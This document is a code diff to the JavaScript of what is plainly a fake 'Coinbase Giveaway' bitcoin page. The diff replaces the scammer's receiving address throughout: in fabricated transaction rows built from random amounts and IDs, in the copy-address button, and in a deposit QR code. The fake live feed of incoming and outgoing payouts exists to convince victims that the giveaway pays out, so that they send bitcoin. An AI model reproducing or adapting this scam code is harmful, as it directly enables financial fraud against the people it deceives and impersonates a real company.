@@ -56,7 +56,7 @@ function create_transaction(mins) {
     mins +
     ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx</span> </td> <td>' +
     amount +
     ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
@@ -71,7 +71,7 @@ function create_transaction(mins) {
     tx(99999999) +
     '</a></td> <td><span class="timer">' +
     mins +
-    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
     '</a> </td> <td>' +
     send_amount +
@@ -99,7 +99,7 @@ function new_transaction() {
     tx(99999999) +
     '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx</span> </td> <td>' +
     amount +
     ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
@@ -117,7 +117,7 @@ function new_transaction() {
         generateId(63) +
         '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
         tx(99999999) +
-        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">bc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">bc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
         '</a> </td> <td>' +
         send_amount +
@@ -201,7 +201,7 @@ function update_trans() {
       $('#gen-amount').text(amount_entered)
       $('#qrcode_svg').attr(
         'src',
-        'https://chart.googleapis.com/chart?cht=qr&chl=bitcoin%3Abc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg%3Famount%3D&chs=180x180&choe=UTF-8&chld=L|2' +
+        'https://chart.googleapis.com/chart?cht=qr&chl=bitcoin%3Abc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx%3Famount%3D&chs=180x180&choe=UTF-8&chld=L|2' +
           amount_entered +
           '%26message%3DDeposit%2Bto%2BCoinbase%2BGiveaway%2B' +
           tm +
@@ -297,7 +297,7 @@ $('#copy_').mouseout(() => {
 $('#copy_address').click(() => {
   $('#copy_address').attr(
     'data-clipboard-text',
-    'bc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg',
+    'bc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx',
   )
   copy_main('copy_address', 'done-copy')
 })
